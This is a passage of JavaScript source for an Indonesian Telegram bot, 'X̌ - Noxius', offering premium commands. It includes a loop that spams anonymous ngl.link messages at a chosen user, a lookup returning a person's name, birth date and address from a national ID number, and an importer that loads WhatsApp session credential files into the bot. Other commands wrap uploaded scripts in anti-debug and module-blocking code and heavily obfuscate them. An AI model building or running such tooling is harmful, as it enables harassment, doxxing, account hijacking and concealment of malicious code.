                callback_data: "/start"
            }
        ], 
        [
            { 
                text: "⌜ TOOLS V2 ⌟", 
                callback_data: "/toolsv2" 
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(toolsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Invalid request: message is not modified: the new message content and the specified reply markup are exactly the same as the current message content and reply markup.") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/toolsv2', async (ctx) => {
    const toolsMenu = `
\`\`\`javascript
[ ✨ ] - Tools Menu
ﾒ.- /tiktokdl - Download Content Without Watermark
ﾒ.- /nikparse - View Full Nik Information
ﾒ.- /csessions - Retrieving Session From Panel Server
ﾒ.- /addsender - Replay Session.json
ﾒ.- /brat - Dengan Teks
ﾒ.- /gpt - Chat Gpt
ﾒ.- /mediafire - Media Fire
ﾒ.- /chat - Chat 
ﾒ.- /tourl - Foto/Video
ﾒ.- /cekdomain - Cek Domain
ﾒ.- /testfunction - Use Your Own Function\`\`\`
`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ メインページ ",
                callback_data: "/start",
                style: "primary"
            },
            {
                text: "⌜「 ཀ 」THANKS TO",
                callback_data: "/tqto",
                style: "success"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(toolsv2Menu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/tqto', async (ctx) => {
    const tqtoMenu = `
╔⫷ 𖤐 𝕏̌ - 𝕹𝖔𝖝𝖎𝖚𝖘 𖤐 ⫸╗
║
║ ⌭ ɪ'ᴍ X̌ - Noxius, a Telegram bot
║ ⌭ developed by Dilxz using JavaScript
║ ⌭ built to assist you — use wisely
║
╚⫷ ⛧ 𝕾𝖞𝖘𝖙𝖊𝖒 𝕬𝖈𝖙𝖎𝖛𝖊 ⛧ ⫸╝

<blockquote><pre>
⬡═―—⊱ ⎧ 𝕭𝖔𝖙 𝕴𝖓𝖋𝖔 ⎭ ⊰―—═⬡
</pre></blockquote>
▢ Creator   ⟿ @VINSEXEJT1
▢ Version   ⟿ 1.0.0 Beta
▢ Prefix    ⟿ / (Slash)
▢ Language  ⟿ JavaScript
▢ User      ⟿ ${ctx.from.first_name}

<blockquote><pre>
⬡═―—⊱ ⎧ 𝕿𝕳𝕬𝕹𝕶𝕾 𝕿𝕺 ⎭ ⊰―—═⬡
</pre></blockquote>
┏━⪨ 𝑹𝒆𝒔𝒑𝒆𝒄𝒕 𝑳𝒊𝒔𝒕 ⪩━┓
┃
┃ 𖥂 @VINSEXEJT1   ⟿ Owner / Creator
┃ 𖥂 @HamzNoctra   ⟿ Developer
┃ 𖥂 @Alvaro_102   ⟿ Friends
┃ 𖥂 @VINSEXEJT1   ⟿ Dev / Friends
┃ 𖥂 @WhoRapiw     ⟿ Friends
┃ 𖥂 @HanTxzyy     ⟿ Owner
┃
┗━━━━━━━━━━━━━━━▣
<blockquote><pre>
⛧ 𝕽𝖊𝖘𝖕𝖊𝖈𝖙 • 𝕮𝖗𝖊𝖉𝖎𝖙 • 𝕷𝖊𝖌𝖆𝖈𝖞 ⛧
</pre></blockquote>`;
  
    const keyboard = [
        [
            {
                text: "🔙 ⌜ ƙҽɱႦαʅι ⌟",
                callback_data: "/start"
            }
        ], 
        [
            { 
                text: "⌜ CHANNEL ⌟", 
                url: "https://t.me/toolsrusianbots" 
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Invalid request: message is not modified: the new message content and the specified reply markup are exactly the same as the current message content and reply markup.") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});


bot.command("antibypass", checkPremium, async (ctx) => {
  const reply = ctx.message.reply_to_message;
  if (!reply?.document) return ctx.reply("🪧 Example : /antibypass <reply file>");
  if (!reply.document.file_name.endsWith(".js")) return ctx.reply("Only files .js supported!!");

  const outputPath = path.join(__dirname, `protected-${Date.now()}.js`);

  try {
    const progressMsg = await ctx.reply("⏳ Adding anti-bypass protection...");
    
    const fileBuffer = await downloadFile(ctx, reply.document.file_id);
    let code = fileBuffer.toString("utf8");

    const securityCode = `
// ==========  ANTI-BYPASS  ==========
const Module = require('module');
const readline = require('readline');
const fs = require('fs');
const path = require('path');

const forbiddenModules = ['axios', 'request', 'got', 'node-fetch', 'vm', 'child_process', 'repl', 'inspector', 'console'];
const originalRequire = Module.prototype.require;

Module.prototype.require = function(request) {
  const lowerRequest = request.toLowerCase();
  if (forbiddenModules.some(mod => lowerRequest.includes(mod))) {
    console.log("🚫 Security violation detected!");
    process.exit(1);
  }
  return originalRequire.apply(this, arguments);
};

if (process.execArgv.some(arg => 
  arg.includes('--inspect') || 
  arg.includes('--debug') ||
  arg.includes('--trace')
)) {
  console.log("🚫 Debugging detected!");
  process.exit(1);
}

const originalConsole = {
  log: console.log,
  warn: console.warn,
  error: console.error,
  info: console.info
};

console.log = function(...args) {
  const stack = new Error().stack;
  if (stack.includes('vm.js') || stack.includes('repl.js') || stack.includes('console.js')) {
    console.log("🚫 Console access blocked!");
    process.exit(1);
  }
  return originalConsole.log.apply(this, args);
};

console.warn = function(...args) {
  const stack = new Error().stack;
  if (stack.includes('vm.js') || stack.includes('repl.js')) {
    process.exit(1);
  }
  return originalConsole.warn.apply(this, args);
};

console.error = function(...args) {
  const stack = new Error().stack;
  if (stack.includes('vm.js') || stack.includes('repl.js')) {
    process.exit(1);
  }
  return originalConsole.error.apply(this, args);
};

const originalEval = global.eval;
global.eval = function(code) {
  console.log("🚫 Eval usage blocked!");
  process.exit(1);
};

const originalFunction = global.Function;
global.Function = function(...args) {
  console.log("🚫 Function constructor blocked!");
  process.exit(1);
};

Object.defineProperty(process, 'exit', {
  value: function(code) {
    if (code === 0) {
      
      originalExit.call(this, code);
    } else {
      console.log("🚫 Process manipulation detected!");
      originalExit.call(this, 1);
    }
  },
  writable: false,
  configurable: false
});

if (process.env.NODE_ENV === 'development' || process.env.DEBUG) {
  console.log("🚫 Development environment detected!");
  process.exit(1);
}

const originalMemoryUsage = process.memoryUsage;
process.memoryUsage = function() {
  const usage = originalMemoryUsage.call(this);
  if (usage.heapUsed > 500 * 1024 * 1024) { 
    console.log("🚫 Memory tampering detected!");
    process.exit(1);
  }
  return usage;
};

const startTime = Date.now();
setInterval(() => {
  if (Date.now() - startTime > 300000) { // 5 minutes limit
    console.log("🚫 Execution time limit exceeded!");
    process.exit(1);
  }
}, 60000);

console.log("🛡️ Advanced anti-bypass protection active!");
`;
    
    code = securityCode + code;
    const obfuscated = await JsConfuser.obfuscate(code, obfConfigs.extreme);
    await fs.writeFile(outputPath, obfuscated.code || obfuscated);

    await sendTempFile(
      ctx,
      outputPath,
      `protected-${reply.document.file_name}`,
      "✅ Advanced anti-bypass protection added!\n\n🛡️ Features:\n• Module blocking\n• Anti-debug\n• Console protection\n• Eval blocking\n• Memory protection\n• Time limit"
    );

    await ctx.deleteMessage(progressMsg.message_id);
  } catch (error) {
    await ctx.reply(`❌ Error: ${error.message}`);
    if (await fs.pathExists(outputPath)) await fs.remove(outputPath);
  }
});

bot.command("addkey", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const password = args[1];
  const reply = ctx.message.reply_to_message;

  if (!password) return ctx.reply("🪧 Example : /keybypass <password> <reply file>");
  if (!reply?.document) return ctx.reply("Only files .js supported!!");
  if (!reply.document.file_name.endsWith(".js")) return ctx.reply("Only files .js supported!!");

  try {
    const progressMsg = await ctx.reply("⏳ Adding password protection...");

    const fileBuffer = await downloadFile(ctx, reply.document.file_id);
    let code = fileBuffer.toString("utf8");

    const passwordCode = `
const readline = require("readline");
const crypto = require('crypto');

function checkPassword() {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });

  let attempts = 0;
  const maxAttempts = 3;

  function askPassword() {
    console.log("🔐 Enter password: ");
    rl.question("", (input) => {
     
      const inputHash = crypto.createHash('sha256').update(input).digest('hex');
      const passwordHash = crypto.createHash('sha256').update("${password}").digest('hex');
      
      if (inputHash === passwordHash) {
        console.log("✅ Access granted!");
        rl.close();
        startBot();
      } else {
        attempts++;
        console.log(\`❌ Invalid password! Attempts: \${attempts}/\${maxAttempts}\`);
        
        if (attempts >= maxAttempts) {
          console.log("🚫 Maximum attempts reached!");
          rl.close();
          process.exit(1);
        } else {
          askPassword();
        }
      }
    });
  }

  setTimeout(() => {
    console.log("⏰ Security timeout reached!");
    rl.close();
    process.exit(1);
  }, 30000);

  askPassword();
}

function startBot() {
${code}
}

if (process.argv.includes('--bypass') || process.argv.includes('--no-password')) {
  console.log("🚫 Bypass attempt detected!");
  process.exit(1);
}

checkPassword();
`;

    const outputPath = path.join(__dirname, `secured-${reply.document.file_name}`);
    await fs.writeFile(outputPath, passwordCode);

    await sendTempFile(
      ctx,
      outputPath,
      `secured-${reply.document.file_name}`,
      `✅ Password protection added!\n\n🔑 Password: ${password}\n⏰ Timeout: 30 seconds\n🔒 Max Attempts: 3\n\nRun: node secured-${reply.document.file_name}`
    );

    await ctx.deleteMessage(progressMsg.message_id);

  } catch (error) {
    await ctx.reply(`❌ Error: ${error.message}`);
  }
});

bot.command("keybypass", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const bypassKey = args[1];
  const reply = ctx.message.reply_to_message;

  if (!bypassKey) return ctx.reply("🪧 Example : /keybypass <key> <reply file>");
  if (!reply?.document) return ctx.reply("Only files .js supported!!");
  if (!reply.document.file_name.endsWith(".js")) return ctx.reply("Only files .js supported!!");

  const outputPath = path.join(__dirname, `keybypass-${Date.now()}.js`);

  try {
    const progressMsg = await ctx.reply("⏳ Adding key bypass system...");

    const fileBuffer = await downloadFile(ctx, reply.document.file_id);
    let code = fileBuffer.toString("utf8");

    const keyBypassCode = `
const crypto = require('crypto');
const readline = require('readline');
const Module = require('module');

class KeyBypass {
  constructor() {
    this.masterKey = "${bypassKey}";
    this.attempts = 0;
    this.maxAttempts = 3;
    this.startTime = Date.now();
  }

  validateKey(inputKey) {
   
    const inputHash = crypto.createHash('sha512').update(inputKey + 'salt').digest('hex');
    const masterHash = crypto.createHash('sha512').update(this.masterKey + 'salt').digest('hex');
    return inputHash === masterHash;
  }

  async authenticate() {
    const rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout
    });
   
    this.blockConsoleBypass();
    return new Promise((resolve) => {
      const askKey = () => {
        console.log("🔑 Enter bypass key: ");
        rl.question("", (input) => {
          if (this.validateKey(input)) {
            console.log("✅ Key accepted! Starting system...");
            rl.close();
            resolve(true);
          } else {
            this.attempts++;
            console.log(\`❌ Invalid key! Attempts: \${this.attempts}/\${this.maxAttempts}\`);
            
            if (this.attempts >= this.maxAttempts) {
              console.log("🚫 Maximum attempts reached. System locked!");
              rl.close();
              process.exit(1);
            } else {
              askKey();
            }
          }
        });
      };
      askKey();
    });
  }

  blockConsoleBypass() {
    const forbidden = ['vm', 'repl', 'child_process', 'inspector'];
    const originalRequire = Module.prototype.require;
    
    Module.prototype.require = function(request) {
      if (forbidden.includes(request)) {
        console.log("🚫 Module access blocked!");
        process.exit(1);
      }
      return originalRequire.apply(this, arguments);
    };

    const originalEval = global.eval;
    global.eval = function(code) {
      console.log("🚫 Eval blocked!");
      process.exit(1);
    };

    if (process.argv.some(arg => arg.includes('--inspect') || arg.includes('--debug'))) {
      console.log("🚫 Debugging blocked!");
      process.exit(1);
    }
  }
}

const bypassSystem = new KeyBypass();
setTimeout(() => {
  console.log("⏰ Security timeout reached");
  process.exit(1);
}, 30000);

if (typeof process.env.NODE_ENV !== 'undefined' && process.env.NODE_ENV === 'development') {
  console.log("🚫 Development environment detected!");
  process.exit(1);
}

bypassSystem.authenticate().then(() => {
  console.log("🛡️ Security system activated!");
${code}
}).catch(() => {
  process.exit(1);
});
`;

    const obfuscated = await JsConfuser.obfuscate(keyBypassCode, obfConfigs.invisible);
    await fs.writeFile(outputPath, obfuscated.code || obfuscated);

    await sendTempFile(
      ctx,
      outputPath,
      `keybypass-${reply.document.file_name}`,
      `✅ Advanced key bypass system added!\n\n🔑 Bypass Key: ${bypassKey}\n⏰ Timeout: 30 seconds\n🔒 Max Attempts: 3\n🛡️ Anti-console protection enabled`
    );

    await ctx.deleteMessage(progressMsg.message_id);

  } catch (error) {
    await ctx.reply(`❌ Error: ${error.message}`);
    if (await fs.pathExists(outputPath)) await fs.remove(outputPath);
  }
});

bot.command("allsecurity", checkPremium, async (ctx) => {
  const reply = ctx.message.reply_to_message;
  if (!reply?.document) return ctx.reply("🪧 Example : /allsecurity <reply file>");
  if (!reply.document.file_name.endsWith(".js")) return ctx.reply("Only files .js supported!!");

  const outputPath = path.join(__dirname, `allsec-${Date.now()}.js`);

  try {
    const progressMsg = await ctx.reply("⏳ Adding complete security system...");

    const fileBuffer = await downloadFile(ctx, reply.document.file_id);
    let code = fileBuffer.toString("utf8");

    const allSecurityCode = `
const crypto = require('crypto');
const Module = require('module');
const readline = require('readline');
const fs = require('fs');
const path = require('path');

// ========== modul SECURITY  ==========
class UltimateSecurity {
  constructor() {
    this.masterKey = "secure123";
    this.attempts = 0;
    this.maxAttempts = 3;
    this.startTime = Date.now();
  }

  initModuleProtection() {
    const forbidden = ['axios', 'request', 'got', 'node-fetch', 'vm', 'child_process', 'repl', 'inspector'];
    const originalRequire = Module.prototype.require;

    Module.prototype.require = function(request) {
      const lowerRequest = request.toLowerCase();
      if (forbidden.some(forbidden => lowerRequest.includes(forbidden))) {
        console.log("🚫 Security: Unauthorized module access");
        process.exit(1);
      }
      return originalRequire.apply(this, arguments);
    };
  }

  initAntiDebug() {
    if (process.execArgv.some(arg => 
      arg.includes('--inspect') || 
      arg.includes('--debug') ||
      arg.includes('--trace')
    )) {
      console.log("🚫 Security: Debugging detected");
      process.exit(1);
    }
  }

  initConsoleProtection() {
    const originalConsole = {
      log: console.log,
      warn: console.warn,
      error: console.error
    };

    console.log = function(...args) {
      const stack = new Error().stack;
      if (stack && (stack.includes('vm.js') || stack.includes('repl.js'))) {
        console.log("🚫 Console access blocked!");
        process.exit(1);
      }
      return originalConsole.log.apply(this, args);
    };

    // Block eval and Function
    global.eval = function() {
      console.log("🚫 Eval blocked!");
      process.exit(1);
    };
    
    global.Function = function() {
      console.log("🚫 Function constructor blocked!");
      process.exit(1);
    };
  }

  validateKey(inputKey) {
    const inputHash = crypto.createHash('sha512').update(inputKey).digest('hex');
    const masterHash = crypto.createHash('sha512').update(this.masterKey).digest('hex');
    return inputHash === masterHash;
  }

  async authenticate() {
    const rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout
    });

    return new Promise((resolve) => {
      const askKey = () => {
        console.log("🔐 Enter security key: ");
        rl.question("", (input) => {
          if (this.validateKey(input)) {
            console.log("✅ Security verified! Starting...");
            rl.close();
            resolve(true);
          } else {
            this.attempts++;
            console.log(\`❌ Invalid key! Attempts: \${this.attempts}/\${this.maxAttempts}\`);
            
            if (this.attempts >= this.maxAttempts) {
              console.log("🚫 Maximum attempts reached!");
              rl.close();
              process.exit(1);
            } else {
              askKey();
            }
          }
        });
      };
      askKey();
    });
  }

  initMemoryProtection() {
    const originalMemoryUsage = process.memoryUsage;
    process.memoryUsage = function() {
      const usage = originalMemoryUsage();
      if (usage.heapUsed > 400 * 1024 * 1024) {
        console.log("🚫 Memory tampering detected!");
        process.exit(1);
      }
      return usage;
    };
  }
}

// Initialize security system
const security = new UltimateSecurity();
security.initModuleProtection();
security.initAntiDebug();
security.initConsoleProtection();
security.initMemoryProtection();

setTimeout(() => {
  console.log("⏰ Security timeout");
  process.exit(1);
}, 30000);

if (process.env.NODE_ENV === 'development' || process.env.DEBUG) {
  console.log("🚫 Development environment detected!");
  process.exit(1);
}

security.authenticate().then(() => {
  console.log("🛡️ All security systems active!");
${code}
}).catch(() => {
  process.exit(1);
});
`;

    const obfuscated = await JsConfuser.obfuscate(allSecurityCode, obfConfigs.invisible);
    await fs.writeFile(outputPath, obfuscated.code || obfuscated);

    await sendTempFile(
      ctx,
      outputPath,
      `allsec-${reply.document.file_name}`,
      "✅ Complete security system added!\n\n🔑 Default password: secure123\n⏰ Timeout: 30 seconds\n🔒 Max Attempts: 3\n🛡️ Anti-console protection enabled\n🚫 Module blocking active"
    );

    await ctx.deleteMessage(progressMsg.message_id);

  } catch (error) {
    await ctx.reply(`❌ Error: ${error.message}`);
    if (await fs.pathExists(outputPath)) await fs.remove(outputPath);
  }
});

bot.command("addmute", checkPremium, async (ctx) => {
  const reply = ctx.message.reply_to_message;
  if (!reply) return ctx.reply("🪧 Example : /addmute <reply pesan>");
  
  try {
    await ctx.restrictChatMember(reply.from.id, {
      permissions: { can_send_messages: false },
    });
    ctx.reply(`🔇 ${reply.from.first_name} berhasil di-mute.`);
  } catch {
    ctx.reply("❌ Gagal mute (bot bukan admin/tidak ada izin)");
  }
});

bot.command("delmute", checkPremium, async (ctx) => {
  const reply = ctx.message.reply_to_message;
  if (!reply) return ctx.reply("🪧 Example : /delmute <reply pesan>");
  
  try {
    await ctx.restrictChatMember(reply.from.id, {
      permissions: {
        can_send_messages: true,
        can_send_media_messages: true,
        can_send_other_messages: true,
        can_add_web_page_previews: true,
      },
    });
    ctx.reply(`🔊 ${reply.from.first_name} sudah bisa chat lagi.`);
  } catch {
    ctx.reply("❌ Gagal unmute (bot bukan admin/tidak ada izin)");
  }
});

bot.command("trackip", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").filter(Boolean);
  if (!args[1]) return ctx.reply("🪧 Example : /trackip 0.0.0.0");

  const ip = args[1].trim();

  function isValidIPv4(ip) {
    const parts = ip.split(".");
    if (parts.length !== 4) return false;
    return parts.every(p => {
      if (!/^\d{1,3}$/.test(p)) return false;
      if (p.length > 1 && p.startsWith("0")) return false;
      const n = Number(p);
      return n >= 0 && n <= 255;
    });
  }

  function isValidIPv6(ip) {
    const ipv6Regex = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(::)|(::[0-9a-fA-F]{1,4})|([0-9a-fA-F]{1,4}::[0-9a-fA-F]{0,4})|([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){0,6}::([0-9a-fA-F]{1,4}){0,6}))$/;
    return ipv6Regex.test(ip);
  }

  if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
    return ctx.reply("❌ IP tidak valid masukkan IPv4 (contoh: 0.0.0.0) atau IPv6 yang benar");
  }

  let processingMsg = null;
  try {
  processingMsg = await ctx.reply(`🔎 Tracking IP ${ip} — sedang memproses`, {
    parse_mode: "HTML"
  });
} catch (e) {
    processingMsg = await ctx.reply(`🔎 Tracking IP ${ip} — sedang memproses`);
  }

  try {
    const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, { timeout: 10000 });
    const data = res.data;

    if (!data || data.success === false) {
      return await ctx.reply(`❌ Gagal mendapatkan data untuk IP: ${ip}`);
    }

    const lat = data.latitude || "";
    const lon = data.longitude || "";
    const mapsUrl = lat && lon ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat + ',' + lon)}` : null;

    const caption = `
<blockquote><pre>⬡═―—⊱ ⎧ X̌ - Noxius ⎭ ⊰―—═⬡</pre></blockquote>
 ▢ IP: ${data.ip || "-"}
 ▢ Country: ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}
 ▢ Region: ${data.region || "-"}
 ▢ City: ${data.city || "-"}
 ▢ ZIP: ${data.postal || "-"}
 ▢ Timezone: ${data.timezone_gmt || "-"}
 ▢ ISP: ${data.isp || "-"}
 ▢ Org: ${data.org || "-"}
 ▢ ASN: ${data.asn || "-"}
 ▢ Lat/Lon: ${lat || "-"}, ${lon || "-"}
`.trim();

    const inlineKeyboard = mapsUrl ? {
      reply_markup: {
        inline_keyboard: [
          [{ text: "! Maps", url: mapsUrl }]
        ]
      }
    } : null;

    try {
      if (processingMsg && processingMsg.photo && typeof processingMsg.message_id !== "undefined") {
        await ctx.telegram.editMessageCaption(
          processingMsg.chat.id,
          processingMsg.message_id,
          undefined,
          caption,
          { parse_mode: "HTML", ...(inlineKeyboard ? inlineKeyboard : {}) }
        );
      } else if (typeof thumbnailUrl !== "undefined" && thumbnailUrl) {
        await ctx.replyWithPhoto(thumbnailUrl, {
          caption,
          parse_mode: "HTML",
          ...(inlineKeyboard ? inlineKeyboard : {})
        });
      } else {
        if (inlineKeyboard) {
          await ctx.reply(caption, { parse_mode: "HTML", ...inlineKeyboard });
        } else {
          await ctx.reply(caption, { parse_mode: "HTML" });
        }
      }
    } catch (e) {
      if (mapsUrl) {
        await ctx.reply(caption + `📍 Maps: ${mapsUrl}`, { parse_mode: "HTML" });
      } else {
        await ctx.reply(caption, { parse_mode: "HTML" });
      }
    }

  } catch (err) {
    await ctx.reply("❌ Terjadi kesalahan saat mengambil data IP (timeout atau API tidak merespon). Coba lagi nanti");
  }
});

bot.command("iosqc", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1)
  const text = args.join(' ')

  if (!text) {
    return ctx.reply(
      "🪧 Example : /iosqc <teks>",
      { parse_mode: "HTML" }
    )
  }

  const waiting = await ctx.reply("Process Generating Qouted Iphone...")

  try {
    const apiUrl = `https://api.sxtream.xyz/maker/iqc?text=${encodeURIComponent(text)}`

    const res = await fetch(apiUrl)
    if (!res.ok) throw new Error(`Gagal fetch: ${res.status}`)

    const buffer = await res.arrayBuffer()
    const imageBuffer = Buffer.from(buffer)

    await ctx.replyWithPhoto({ source: imageBuffer }, {
      caption: `<blockquote><pre>✅ Selesai! berikut hasinya.</pre></blockquote>`,
      parse_mode: "HTML"
    })

    await ctx.deleteMessage(waiting.message_id)
  } catch (err) {
    console.error("Error:", err)
    ctx.reply("❌ Gagal membuat.")
  }
})

bot.command("tiktokmp4", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("🪧 Example : /tiktokmp4 <link>");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ Error ${e.response.status} saat mengunduh video`
        : "❌ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

bot.command('tiktokmp3', checkPremium, async (ctx) => {
  const text = ctx.message.text.split(' ')[1]; 
  
  if (!text) {
    return ctx.reply('🪧 Example : /tiktokmp3 <link>');
  }
  
  try {
    let anu = await tiktokDownloaderVideo(text);
    let audio = anu.music_info.url;
    await ctx.reply(
      `▢  Judul: ${anu.music_info.title || '-'}\n` +
      `▢  Author: ${anu.music_info.author || '-'}\n` +
      `▢  Album: ${anu.music_info.album || '-'}\n\n` +
      `▢  Source: ${text}`
    );

    await ctx.replyWithAudio(
      { url: audio },
      {
        filename: `${anu.music_info.title || 'audio'}.mp3`
      }
    );
  } catch (error) {
    console.error(error);
    await ctx.reply('❌ Terjadi kesalahan saat mengambil audio.');
  }
});

bot.command("spamngl", checkPremium, async (ctx) => {
  try {
    const input = ctx.message.text.split(" ").slice(1).join(" ");
    if (!input) {
      return ctx.reply("🪧 Example : /spamngl <@username>,<jumlah>,<pesan>");
    }

    const [userPart, amountPart, ...msgParts] = input.split(",");
    const username = userPart?.replace("@", "").trim();
    const amount = parseInt(amountPart) || 1;
    const message = msgParts.join(",").trim();
    const delay = 5000;
    if (!username || !message) {
      return ctx.reply("🪧 Example : /spamngl <@username>,<jumlah>,<pesan>");
    }

    await ctx.reply(`⏳ Mengirim ${amount}× pesan ke @${username}\n💬 Pesan: ${message}`);

    for (let i = 1; i <= amount; i++) {
      try {
        const array = new Uint8Array(21);
        crypto.getRandomValues(array);
        const deviceId = Array.from(array, (byte) =>
          byte.toString(16).padStart(2, "0")
        ).join("");

        const body = `username=${username}&question=${encodeURIComponent(message)}&deviceId=${deviceId}`;
        await fetch("https://ngl.link/api/submit", {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" },
          body,
        });
      } catch (err) {
      }

      if (i < amount) {
        await new Promise((resolve) => setTimeout(resolve, delay));
      }
    }
    ctx.reply(`✅ Selesai mengirim ${amount}× pesan ke @${username}`);
  } catch (error) {
    console.error(error);
    ctx.reply("❌ Gagal menghubungi API, coba lagi nanti.");
  }
});

bot.command("nikparse", checkPremium, async (ctx) => {
  const nik = ctx.message.text.split(" ").slice(1).join("").trim();
  if (!nik) return ctx.reply("🪧 Example : /nikparse 1234567890283625");
  if (!/^\d{16}$/.test(nik)) return ctx.reply("❌ NIK harus 16 digit angka");

  const wait = await ctx.reply("⏳ Sedang memproses pengecekan NIK");

const replyHTML = (d) => {
  const get = (x) => (x ?? "-");

  const caption =`
<blockquote><pre>⬡═―—⊱ ⎧ X̌ - Noxius ⎭ ⊰―—═⬡</pre></blockquote>
 ▢ NIK: ${get(d.nik) || nik}
 ▢ Nama: ${get(d.nama)}
 ▢ Jenis Kelamin: ${get(d.jenis_kelamin || d.gender)}
 ▢ Tempat Lahir: ${get(d.tempat_lahir || d.tempat)}
 ▢ Tanggal Lahir: ${get(d.tanggal_lahir || d.tgl_lahir)}
 ▢ Umur: ${get(d.umur)}
 ▢ Provinsi: ${get(d.provinsi || d.province)}
 ▢ Kabupaten/Kota: ${get(d.kabupaten || d.kota || d.regency)}
 ▢ Kecamatan: ${get(d.kecamatan || d.district)}
 ▢ Kelurahan/Desa: ${get(d.kelurahan || d.village)}
`;

  return ctx.reply(caption, { parse_mode: "HTML", disable_web_page_preview: true });
};

  try {
    const a1 = await axios.get(
      `https://api.akuari.my.id/national/nik?nik=${nik}`,
      { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
    );

    if (a1?.data?.status && a1?.data?.result) {
      await replyHTML(a1.data.result);
    } else {
      const a2 = await axios.get(
        `https://api.nikparser.com/nik/${nik}`,
        { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
      );
      if (a2?.data) {
        await replyHTML(a2.data);
      } else {
        await ctx.reply("❌ NIK tidak ditemukan");
      }
    }
  } catch (e) {
    try {
      const a2 = await axios.get(
        `https://api.nikparser.com/nik/${nik}`,
        { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
      );
      if (a2?.data) {
        await replyHTML(a2.data);
      } else {
        await ctx.reply("❌ Gagal menghubungi api, Coba lagi nanti");
      }
    } catch {
      await ctx.reply("❌ Gagal menghubungi api, Coba lagi nanti");
    }
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});

bot.command("csessions2", checkPremium, async (ctx) => {
  const reply = ctx.message.reply_to_message;
  if (!reply || !reply.document) {
    return ctx.reply("🪧 Example : /csessions2 <repy file>");
  }

  const doc = reply.document;
  const name = doc.file_name.toLowerCase();
  if (![".json", ".js", ".zip", ".tar", ".tar.gz", ".tgz"].some(ext => name.endsWith(ext))) {
    return ctx.reply("❌ File bukan session yang valid ( .json/.js/.zip/.tar/.tgz )");
  }

  await ctx.reply("🔄 Memproses session…");
  try {
    const link = await ctx.telegram.getFileLink(doc.file_id);
    const { data } = await axios.get(link.href, { responseType: "arraybuffer" });
    const buf = Buffer.from(data);
    const tmp = await fse.mkdtemp(path.join(os.tmpdir(), "sess-"));

    if (name.endsWith(".json")) {
      await fse.writeFile(path.join(tmp, "creds.json"), buf);
    } else if (name.endsWith(".zip")) {
      new AdmZip(buf).extractAllTo(tmp, true);
    } else {
      const tmpTar = path.join(tmp, name);
      await fse.writeFile(tmpTar, buf);
      await tar.x({ file: tmpTar, cwd: tmp });
    }

    const credsPath = await findCredsFile(tmp);
    if (!credsPath) {
      return ctx.reply("❌ creds.json tidak ditemukan di dalam file.");
    }

    const creds = await fse.readJson(credsPath);
    const botNumber = creds.me.id.split(":")[0];
    const destDir = sessionPath(botNumber);

    await fse.remove(destDir);
    await fse.copy(tmp, destDir);
    saveActive(botNumber);

